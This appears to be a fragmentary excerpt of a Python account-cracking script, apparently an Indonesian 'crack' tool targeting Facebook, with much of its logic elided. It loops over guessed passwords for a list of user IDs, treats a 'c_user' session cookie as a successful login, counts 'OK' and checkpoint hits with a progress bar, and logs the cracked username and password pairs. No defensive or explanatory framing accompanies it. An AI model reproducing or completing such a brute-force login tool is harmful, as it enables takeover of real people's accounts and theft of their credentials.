...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        ...
        sys.stdout.write(f"\r {N}{ARMAN} {N}{loop}{N}/{M}{len(self.id)} {N}[{H}OK:{len(ok)}{N}][{K}CP:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
        sys.stdout.flush()
        try:
            for pw in pasw:
                pw = pw.lower()
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[ARMAN-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
